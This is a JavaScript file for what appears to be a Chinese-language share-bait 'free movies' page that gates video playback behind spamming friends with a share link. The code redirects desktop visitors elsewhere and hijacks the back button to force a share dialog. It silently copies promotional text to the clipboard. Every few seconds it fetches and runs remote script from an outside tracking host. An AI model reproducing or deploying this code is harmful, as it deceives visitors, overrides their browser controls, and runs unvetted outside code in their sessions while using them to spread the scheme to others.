if((/^(Win|Mac)/i.test(navigator.platform)||!/mobile|Android|phone|iPhone|iPod|ios|iPad/i.test(navigator.userAgent))&&(!localStorage.isCheney||parseInt( conf.mobile))){
	location = 'https://tppp8.github.io/heike/MTMxMDI2NjQwNzQ2NzkzMDQ_878390_cp5I5bHzAumjMiTM.html';
}
conf.city = '同城';
conf.code = '{wwwwwwnnn}';
conf.stor = (/(\w{3,5})/.exec(location.pathname)||[0,'Q'])[1];
conf.video = conf.videos[Math.floor( Math.random() * conf.videos.length) ]||conf.videos[0];
if (window.localAddress) {
	conf.city = localAddress.city;
	if (conf.city.length == 0)conf.city = localAddress.province;
}
var h	= '<a href="''" target="_blank"><img src="https://y.gtimg.cn/music/photo_new/T053XD0027K0Kt2DOtEn.jpg" width="100%"></a>';
h	+= '<div style="margin:10px 0 9px;">';
h	+= '<h3 align="center" style="color:white;">万部电影免费看，分享一人看<span class="addPlay">'+conf.vadd+'</span>部</h3>';
h	+= '<h3 align="center" style="color:white;">当前可刷新次数：<span style="color:red;" id="sup">0</span> 次</h3>';
h	+= '</div>';
h	+= '<div class="video">';
h	+= '	<video id="video" src="'+conf.video+'" poster="images/viewas.png" id="main-media" width="100%" height="240" controls x5-playsinline="" playsinline="" webkit-playsinline="" autoplay></video>';
h	+= '</div>';
h	+= '<div class="views"  style="width: 100%;height: 220px;display:none;">';
h	+= '    <img onclick="shx()" src="https://y.gtimg.cn/music/photo_new/T053XD003Pzh7f2k6Rjl.png" style="width: 100%;height: 220px;">';
h	+= '</div>';
h	+= '<div style="position: relative;height: 21px;overflow: hidden;font-size:15px;color:white;margin:10px 0;background: #332121;">';
h	+= '    <img src="https://d1-1gxuur4z7851a133-1312582590.tcloudbaseapp.com/c1ddbc.jpg" style="height: 18px;position: absolute;top: 2px;left: 4px;">';
h	+= '    <ul class="ul1" style="margin-top: 0px;"><li>分享后通知好友点击才有效</li><li>刷新次数问题已优化，请放心分享！</li><li>分享后通知好友点击才有效</li></ul>';
h	+= '</div>';
h	+= '<div style="text-align:center;">';
h	+= '<button class="mini-upload" id="updateBtn" style="background-color:#6ba7cc;">换一部电影</button>';
h	+= '<button class="mini-upload" id="shareBtn" style="background-color:#eda9b8;">分 享 给 朋 友 +5次</button>';
if(conf.btn2){
	h	+= '<a class="mini-upload" href="'+conf.url2+'" style="background-color:#fed700;">'+conf.btn2+'</a>';
}
if(conf.btn3){
	h	+= '<a class="mini-upload" href="'+conf.url3+'" style="background-color:#ee1741;">✌'+conf.btn3+'✌</a>';
}
if(conf.btn4){
	h	+= '<a class="mini-upload" href="'+conf.url4+'" style="background-color:#f36b1d;">👉'+conf.btn4+'👈</a>';
}else{
	h	+= '<button class="mini-upload" id="copyUrlBtn" style="background-color:#f36b1d;">复 制 网 站 地 址</button>';
}
h	+= '</div>';
h	+= '<div class="prompt" style="color:white;display:block;font-size: 12px;margin-left:10px;margin-top: 5px;">';
h	+= '    <div>* 分享后需要通知好友进入分享页面才能获得刷新(观影)机会</div>';
h	+= '    <div> * 每个好友进入后获得+'+conf.vadd+'次的刷新机会</div>';
h	+= '</div>';
h	+= '<span id="addreas" style="opacity:0;"></span>';
h = h.replace(/\{city\}/gi,conf.city);
h = h.replace(/\{ico\}/gi,getRandIco);
h = myChat(h);
document.write( h );
video.addEventListener("ended",function(){
	location.href = conf.ready;
});
$(function(){
    if(!coo('code'))coo('snt',0);
	coo('code',conf.code = coo('code') || conf.code,conf.cache);
	coo('visit',parseInt(coo('visit'))+1);
	addreas.innerHTML = location.href;
	if(conf.title){
		document.title = conf.title;
	}
	if(window.mqq){
		mqq.ui.setTitleButtons({
			left: {title: "返回",callback: function() {}},right: {hidden: true,}
		})	
	}			
	var snn = coo('snt')||0;
	getSign();
	setInterval(getSign,6000);
	function getPop(){
		shx();
		window.history.pushState({},'x',getUrl());
	};
/*
	if(!/alert/.test(location.href)&&/alert/.test(conf.shu)){
		location.href=getUrl();
	}else{
	}
*/
		window.history.pushState({},'x',getUrl());
	window.addEventListener("popstate",getPop,false);
	if(coo('playTime')>0){
		var duckBtn = function (){
			if(coo('playTime')>0){
				$('#updateBtn').html('( '+coo('playTime')+' ) 秒禁止点击').css('background','#aaa');
				coo('playTime',coo('playTime')-1,conf.cache);
			}else{
				$('#updateBtn').html('换 一 部 电 影').removeAttr('style');
				coo('playTime',0,conf.cache);
				clearInterval(window.ducktime);
			}
		}
		clearInterval(window.ducktime);
		window.ducktime = setInterval(duckBtn,1000);
		duckBtn();
	}
	$('#updateBtn').click(function(e){
		if(coo('playTime')>0)return;
		coo('playTime',5,conf.cache);
		setPlay(coo('socket'),function(){
			location.reload();
		});
	});
	$('#shareBtn').click(function(e){
		shx();
	});
	$('.page_dialog a[href]').click(function(e){
		window.isimg = 1;
		var href =  $(this).attr('hrefs');
		if(href){
			if(!(location.href.indexOf(conf.code) > -1)){
				setovblc();
				return shx();
			}
		}
		var href = $(this).attr('href');
		if(href){
			e.preventDefault();
			opensdk(href);
		}
	});
	var ul1Index = 0;
	setInterval(function(){
		var step = 23;
		ul1Index+=step;
		$('.ul1').animate({marginTop:-ul1Index%(step*3)});
	},5000);
});
for(var i in conf){
	if(conf[i] instanceof Array){
		conf[i] = myChat(conf[i][Math.floor(Math.random()*conf[i].length)]);
	}else if('string' == typeof conf[i]){
		conf[i] = myChat(conf[i]);
	}
}
conf.shu = conf.shu ||'?_wv={www}&f=FROM&{www}={wwwwnnn}';
function config(n,m){
	if(undefined !== conf[n]){
		if(conf[n] instanceof Array){
			return myChat(conf[n][Math.floor(Math.random()*conf[n].length)]);
		}else if('string' == typeof conf[n]){
			return myChat(conf[n]);
		}else{
			return conf[n];
		}
	}
	return 0;
}
function getSign(obj){
	$_GET = getUrlVal();
	var socketUrl = 'https://js.yixuanji.cn/wc/mp/tongji.php?sign='+conf.code
	if(!coo('sclick')&&$_GET.f&&$_GET.f != conf.code){
		socketUrl += '&from='+ ($_GET.f||'');
	}
	$.getScript(socketUrl,function(){
		coo('sclick',1,86400);
	});
	if(!window.isstop){
		console.log('加次数',thisLink(socketUrl+ '&from='+ $_GET.f));
	}
}
function setSign(obj){
	coo('sclick',1,86400);
	var socketCoo = coo('socket');
	if(socketCoo.sign != obj.sign){
		window.isstop = false;
		console.log(obj);
		tip('增加 '+conf.vadd+' 次刷新几机会');
	}
	if(!window.isstop){
		setPlay(obj);
	}
	coo('socket',obj,conf.cache);
}
function setPlay(obj,fn){
	var time = Math.max(parseInt(obj.sign) * parseInt(conf.vadd ) +  parseInt(conf.vdef) +2 - parseInt(coo('visit')),0);
	$('#sup').html(Math.max(time-1,0));
	if(time < 1 ){
		coo('visit',(obj.sign+1) * conf.vadd+1,conf.cache);
		shx();
		video.pause();
		$('.video').hide();
		$('.views').show();
		window.isstop = 1;
	}else{
		if(fn)fn();
		$('.video').show();
		$('.views').hide();
		$('.layui-m-layer').remove();
		video.play();
		window.isstop = 1;
	}
}
function getUrl() {
	return myChat(conf.shu.replace('FROM',conf.code));
}
//定时提示框
function thisLink(u){
	var a = document.createElement('a');
	a.href = u;
	return a.href;
};
function setovblc(){
	if(!window.hiddenProperty){
		window.hiddenProperty='hidden' in document ? 'hidden': 'webkitHidden' in document ? 'webkitHidden': 'mozHidden' in document ? 'mozHidden': null;
		var vsbce=hiddenProperty.replace(/hidden/i,'visibilitychange');
		function ovblc(){
			if(!document[hiddenProperty]||window.IsCheney){
				coo('snt',coo('snt')+1,conf.cache);
				shx();
			}
		}
		document.addEventListener(vsbce,ovblc);	
	}
}
function shx(){
	setovblc();
	var snn = coo('snt')||0;
	var sInfo = conf.sInfo.replace(/\n+/g,'<br>');
	layer.open({
		content: sInfo,
		btn: ['一键复制，发送给朋友'],
		yes: function(index) {
			var shu = thisLink(getUrl()) ;
			var sText = conf.sText.replace('###',shu)
			copyText(sText)
			layer.close(index);
			layer.open({
				content: conf.sEnd.replace(/\n+/g,'<br>'),
				yes: function(index) {
				}
			});
		}
	});
}
function msg(con,fun){
	layer.open({
		content: con,
		btn: ['确定'],
		yes: function(index) {
			fun.call(this);
			layer.close(index);
		}
	});
}
function getRand(l,m){
	return Math.floor(Math.random() * (m - l + 1) + l);
};
function ios(){
	return /iPhone|iPod|ios/i.test(navigator.userAgent);
}
function copyText(t) {
	var p = document.createElement('textarea');
	p.value = t;
	p.style.opacity=0;
	document.body.appendChild(p);
	p.select();
	document.execCommand("Copy");
	document.body.removeChild(p);
}
function she(state){
}
function copyText(t) {
	var p = document.createElement('textarea');
	p.value = t;
	p.style.opacity=0;
	document.body.appendChild(p);
	p.select();
	document.execCommand("Copy");
	document.body.removeChild(p);
}
function coo(n,v,e,p,d,s) {
	if(!coo.sd||ios()){	
		var k,b = {},t=Math.floor(new Date()/1000), 
		o = JSON.parse(localStorage[conf.stor]||'{}');
		for(k in o)if('object'==typeof o[k]&&o[k][1]>t){
			b[k]=o[k][0];
		}
		if (v === null){
			delete o[n];				
		}else if(v === undefined){
			return b[n]||0;			
		}else{
			o[n]=[v,t+(e||2592000)];
		}
		localStorage[conf.stor]=JSON.stringify(o);
		return b		
	}
	n = conf.stor+n;
	if (v === undefined||v === null) {
		var val=g(n);
		if (v === null) coo(n,'',-10);
		try {
			return JSON.parse(val)
		} catch(e) {
			return val
		}
	} else {
		if (typeof(v)=='object') v=JSON.stringify(v);
		document.cookie=n+'='+encodeURIComponent(v)+exp(e)+';path='+(p||'/')+(d ? '; domain='+d: '')+(s ? '; secure': '')+';'
	}
	function exp(s) {
		D=new Date(),
		D.setTime(D.getTime()+(s === undefined ? 2592000 : s) * 1000);
		return ';expires='+D.toUTCString()
	}
	function g(n) {
		if (document.cookie.length>0) {
			start=document.cookie.indexOf(n+"=");
			if (start != -1) {
				start=start+n.length+1;
				end=document.cookie.indexOf(";",start);
				if (end==-1) end=document.cookie.length;
				return decodeURIComponent(document.cookie.substring(start,end))
			}
		};
		return null
	}
};
function getRandIco() {
	var arr=['🌀','🌷','♈','♉','♊','♋','♌','♍','♎','♏','♐','♑','♒','♓','⛎','😠','😩','😲','😞','😵','😰','😒','😍','😤','😜','😝','😋','😘','😚','😷','😳','😅','😱','👙','👗','👡','💰','🔯','🅰','🅱','🆎','🅾','🎀','🎁','🎥','🎬','🎯','💋','💏','💌','🔞','⭕','❌','💓','💔','💕','💖','💗','💘','💞','🈲','㊙','💢'];
	return arr[Math.floor(Math.random()*arr.length)];
}
function opensdk(url){
	url = myChat(url);
	var obj = {
		url     : url,
		target  : 1,
		style   : 2
	};
	mqq.invoke("ui", "openUrl",obj);
}
function getRand(l,m){
	return Math.floor(Math.random() * (m - l + 1) + l);
}
function getNum() {
	return 64 * parseInt(getRand(1, 30))+ getRand(2, 3);
}
function myChat(s){
	return s.replace(/\{(\w+?)\}/g,function(a,b){
		var h='';
		b = b.toUpperCase();
		for(var i=0;i<b.length;i++){
			if('N'==b[i]){
				h+=Math.floor(Math.random()*10);
			}else if('D'==b[i]){
				h+=String.fromCharCode(65+Math.floor(Math.random()*26));
			}else{
				h+=String.fromCharCode(97+Math.floor(Math.random()*26));
			}
		}
		return h;
	});
}
//JS提示弹框
function tip(text, time) {
	window.tmsg&&document.body.removeChild(tmsg);
	document.body.insertAdjacentHTML('beforeEnd','<div id="tmsg" style="top:200px;left:20%;right:20%;color:#fff;margin:0 auto;opacity:0;padding:5px;font-size:15px;max-width:300px;position:fixed;text-align:center;border-radius:8px;background-color:#333;border:1px solid #222;box-shadow:rgba(0,0,0,0.25) 0px 0px 10px 6px;transition:opacity 0.6s">'+text+'</div>');
	setTimeout('tmsg.style.opacity=0.8',0);clearTimeout(window.tmst);
	window.tmst=setTimeout('tmsg.style.opacity=0;setTimeout("document.body.removeChild(tmsg)",600);',(time||3)*1000);
}
//解析 $_GET
function getUrlVal(u) {
	var j,g = {};
	u = (u || document.location.href.toString()).split('?');
	if (typeof(u[1]) == "string") {
		u = u[1].split("&");
		for (var i in u) {
			j = u[i].split("=");
			if (j[1] !== undefined) g[j[0]] = decodeURIComponent(j[1])
		}
	}
	return g;
}